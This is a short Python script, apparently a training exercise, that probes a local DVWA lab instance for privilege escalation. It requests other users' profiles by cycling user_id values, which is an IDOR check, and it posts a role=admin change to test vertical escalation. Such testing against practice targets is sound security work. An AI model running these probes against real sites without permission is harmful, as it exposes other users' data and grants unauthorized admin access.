import requests

# Target website
url = "http://localhost/DVWA/profile.php"

# Session to maintain login
session = requests.Session()

print("Starting privilege escalation testing...\n")

# Example user IDs to test
user_ids = ["1", "2", "3", "4", "5"]

# Horizontal Privilege Escalation Test
print("Testing Horizontal Privilege Escalation...\n")

for uid in user_ids:
    params = {"user_id": uid}

    response = session.get(url, params=params)

    print(f"Trying to access user_id={uid}")

    if "User Profile" in response.text:
        print(f"[Possible Horizontal Access] Able to view data of user {uid}\n")


# Vertical Privilege Escalation Test
print("Testing Vertical Privilege Escalation...\n")

data = {
    "username": "testuser",
    "role": "admin"
}

response = session.post("http://localhost/DVWA/update_role.php", data=data)

if "admin panel" in response.text.lower():
    print("[Possible Vertical Privilege Escalation] User became admin!")

print("\nTesting completed.")